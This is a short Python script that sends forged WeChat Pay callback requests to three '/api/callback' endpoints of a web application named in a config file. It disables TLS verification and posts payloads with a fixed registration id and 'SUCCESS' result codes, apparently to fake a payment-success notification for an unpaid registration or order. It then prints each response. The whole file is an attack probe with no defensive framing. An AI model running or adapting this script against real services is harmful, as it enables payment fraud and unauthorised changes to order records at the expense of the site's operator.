# -*- coding: utf-8 -*-
import json, sys, functools
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
print = functools.partial(print, flush=True)
import yaml, requests
requests.packages.urllib3.disable_warnings()

cfg = yaml.safe_load(open("config.yaml", encoding="utf-8"))
base = cfg["base_url"].rstrip("/")
rid, pid, sid = 7717, 2028, 1848

payloads = [
    {"register_id": rid, "registerId": rid, "id": rid},
    {"out_trade_no": str(rid), "result_code": "SUCCESS", "return_code": "SUCCESS"},
    {"attach": json.dumps({"register_id": rid})},
]
paths = [
    "/api/callback/weChatProjectV3",
    "/api/callback/weChatProject",
    "/api/callback/weChatOrder",
]
for path in paths:
    for data in payloads:
        r = requests.post(base + path, data=data, verify=False, timeout=20)
        print(path, list(data.keys()), "->", r.status_code, (r.text or "")[:120])
